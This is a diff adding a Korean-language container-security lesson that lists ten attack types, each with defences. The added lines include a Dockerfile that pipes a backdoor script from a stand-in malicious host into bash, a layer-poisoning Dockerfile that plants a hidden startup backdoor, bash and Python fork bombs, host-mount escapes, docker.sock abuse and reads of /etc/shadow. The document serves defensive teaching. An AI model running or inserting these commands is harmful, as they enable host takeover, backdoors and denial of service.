@@ -79,6 +79,230 @@ graph TB
 - **네트워크 노출**: 불필요한 포트 개방
 - **리소스 남용**: 무제한 리소스 사용으로 인한 DoS
 
+### 🚨 실제 컨테이너 공격 사례 5가지 (추가 학습)
+
+#### 1. **Container Escape (컨테이너 탈출)**
+> **공격 방법**: 컨테이너 내부에서 호스트 시스템으로 탈출하여 전체 시스템 제어
+
+```bash
+# 위험한 예시 - 절대 실제 환경에서 사용 금지
+# --privileged 옵션으로 실행된 컨테이너에서 호스트 접근
+docker run --privileged -it ubuntu:latest /bin/bash
+# 컨테이너 내부에서 호스트 파일시스템 마운트
+mount /dev/sda1 /mnt
+chroot /mnt
+```
+
+**대응 방안**:
+- `--privileged` 옵션 사용 금지
+- 필요한 경우에만 특정 capability 부여
+- AppArmor/SELinux 보안 프로파일 적용
+
+#### 2. **Dirty COW (CVE-2016-5195) 활용**
+> **공격 방법**: 리눅스 커널 취약점을 이용한 권한 상승 공격
+
+```bash
+# 취약점 확인 (교육 목적)
+cat /proc/version  # 커널 버전 확인
+# 2.6.22 < kernel < 4.8.3 버전에서 취약
+
+# 공격 시나리오
+# 1. 읽기 전용 파일을 쓰기 가능하게 변경
+# 2. /etc/passwd 파일 수정으로 root 권한 획득
+```
+
+**대응 방안**:
+- 호스트 커널 정기 업데이트
+- 컨테이너 런타임 보안 업데이트
+- 읽기 전용 파일시스템 사용
+
+#### 3. **Docker Socket 노출 공격**
+> **공격 방법**: Docker 소켓을 컨테이너에 마운트하여 호스트 제어
+
+```bash
+# 위험한 설정 예시 - 절대 사용 금지
+docker run -v /var/run/docker.sock:/var/run/docker.sock \
+           -it docker:latest /bin/sh
+
+# 컨테이너 내부에서 호스트의 다른 컨테이너 제어 가능
+docker ps  # 호스트의 모든 컨테이너 조회
+docker exec -it target_container /bin/bash  # 다른 컨테이너 접근
+```
+
+**대응 방안**:
+- Docker 소켓 마운트 절대 금지
+- 필요시 Docker-in-Docker 대신 Kaniko, Buildah 사용
+- 최소 권한 원칙 적용
+
+#### 4. **Malicious Image Supply Chain Attack**
+> **공격 방법**: 악성 코드가 포함된 이미지를 공식 이미지로 위장하여 배포
+
+```bash
+# 공격 시나리오
+# 1. 인기 있는 이미지와 유사한 이름으로 악성 이미지 업로드
+# 예: nginx -> ngnix, ubuntu -> ubunto
+
+# 2. 이미지 내부에 백도어나 크립토마이너 삽입
+FROM ubuntu:latest
+RUN apt-get update && apt-get install -y curl
+# 악성 스크립트 다운로드 및 실행
+RUN curl -s http://malicious-site.com/backdoor.sh | bash
+```
+
+**대응 방안**:
+- 공식 이미지만 사용 (Docker Official Images)
+- 이미지 서명 검증 (Docker Content Trust)
+- 프라이빗 레지스트리 사용
+- 이미지 스캔 도구로 사전 검증
+
+#### 5. **Resource Exhaustion (Fork Bomb)**
+> **공격 방법**: 컨테이너 내에서 무한 프로세스 생성으로 호스트 리소스 고갈
+
+```bash
+# Fork Bomb 예시 - 절대 실제 환경에서 실행 금지
+# Bash Fork Bomb
+:(){ :|:& };:
+
+# Python Fork Bomb
+import os
+while True:
+    os.fork()
+
+# 결과: 시스템 리소스 고갈로 호스트 다운
+```
+
+**대응 방안**:
+```bash
+# 리소스 제한 설정
+docker run --memory=512m \
+           --cpus=1.0 \
+           --pids-limit=100 \
+           --ulimit nproc=1024:2048 \
+           ubuntu:latest
+```
+
+#### 6. **Symlink Attack (심볼릭 링크 공격)**
+> **공격 방법**: 심볼릭 링크를 이용하여 호스트 파일시스템의 민감한 파일에 접근
+
+```bash
+# 공격 시나리오
+# 1. 컨테이너 내부에서 호스트 파일을 가리키는 심볼릭 링크 생성
+ln -s /etc/passwd /app/config.txt
+ln -s /etc/shadow /app/secrets.txt
+
+# 2. 애플리케이션이 이 파일들을 읽으면서 호스트 정보 노출
+cat /app/config.txt  # 실제로는 /etc/passwd 내용
+```
+
+**대응 방안**:
+- 읽기 전용 파일시스템 사용
+- 심볼릭 링크 생성 금지 정책
+- 파일 접근 권한 엄격히 제한
+
+#### 7. **Environment Variable Injection**
+> **공격 방법**: 환경 변수를 통한 악성 코드 주입 및 설정 변조
+
+```bash
+# 위험한 환경 변수 설정 예시
+docker run -e "PATH=/malicious/path:$PATH" \
+           -e "LD_PRELOAD=/malicious/lib.so" \
+           -e "DATABASE_URL=postgresql://attacker:pass@evil.com/db" \
+           vulnerable-app:latest
+
+# 애플리케이션 실행 시 악성 라이브러리 로드 또는 잘못된 DB 연결
+```
+
+**대응 방안**:
+- 환경 변수 화이트리스트 방식 사용
+- 민감한 정보는 Secret 관리 도구 사용
+- 환경 변수 검증 로직 구현
+
+#### 8. **Shared Namespace Attack**
+> **공격 방법**: 네임스페이스 공유를 통한 다른 컨테이너나 호스트 정보 접근
+
+```bash
+# 위험한 네임스페이스 공유 예시
+# PID 네임스페이스 공유로 호스트 프로세스 조회
+docker run --pid=host -it ubuntu:latest ps aux
+
+# 네트워크 네임스페이스 공유로 호스트 네트워크 접근
+docker run --net=host -it ubuntu:latest netstat -tulpn
+
+# IPC 네임스페이스 공유로 다른 프로세스와 통신
+docker run --ipc=host -it ubuntu:latest ipcs
+```
+
+**대응 방안**:
+- 기본 네임스페이스 격리 유지
+- 필요한 경우에만 제한적 네임스페이스 공유
+- 네임스페이스 공유 시 추가 보안 조치
+
+#### 9. **Image Layer Poisoning**
+> **공격 방법**: 이미지 레이어에 악성 코드를 숨겨서 탐지를 회피
+
+```dockerfile
+# 공격 시나리오 - 중간 레이어에 악성 코드 삽입
+FROM ubuntu:latest
+RUN apt-get update && apt-get install -y curl
+# 악성 파일 다운로드 (숨겨진 레이어)
+RUN curl -s http://malicious.com/backdoor -o /tmp/.hidden
+RUN chmod +x /tmp/.hidden
+# 정상적인 애플리케이션 설치로 위장
+RUN apt-get install -y nginx
+# 시작 스크립트에서 백도어 실행
+RUN echo '/tmp/.hidden &' >> /etc/rc.local
+```
+
+**대응 방안**:
+- 멀티 스테이지 빌드로 최종 이미지 최소화
+- 이미지 레이어별 스캔
+- 베이스 이미지 신뢰성 검증
+
+#### 10. **Container Breakout via Kernel Exploits**
+> **공격 방법**: 커널 취약점을 이용한 컨테이너 탈출 및 호스트 권한 획득
+
+```bash
+# 커널 취약점 예시 (CVE-2022-0847 - Dirty Pipe)
+# 파이프를 통한 읽기 전용 파일 수정 취약점
+
+# 1. 취약점 확인
+uname -r  # 커널 버전 확인
+# 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102에서 취약
+
+# 2. 공격 시나리오
+# - 읽기 전용 파일 수정
+# - /etc/passwd 변조로 root 권한 획득
+# - 컨테이너에서 호스트로 탈출
+```
+
+**대응 방안**:
+- 커널 정기 업데이트
+- 컨테이너 런타임 보안 패치
+- gVisor, Kata Containers 등 추가 격리 기술 사용
+- 런타임 보안 모니터링 (Falco 등)
+
+**종합 보안 체크리스트**:
+```mermaid
+graph TB
+    A[컨테이너 보안 체크] --> B{권한 검사}
+    B -->|Pass| C{이미지 검증}
+    B -->|Fail| X[배포 중단]
+    C -->|Pass| D{리소스 제한}
+    C -->|Fail| X
+    D -->|Pass| E{네트워크 정책}
+    D -->|Fail| X
+    E -->|Pass| F[배포 승인]
+    E -->|Fail| X
+    
+    style A fill:#e3f2fd
+    style B fill:#fff3e0
+    style C fill:#fff3e0
+    style D fill:#fff3e0
+    style E fill:#fff3e0
+    style F fill:#4caf50
+    style X fill:#f44336
+```
+
 ### 🔍 개념 2: 이미지 보안 스캔 (12분)
 > **정의**: 컨테이너 이미지의 취약점을 자동으로 검사하고 보고하는 프로세스
 
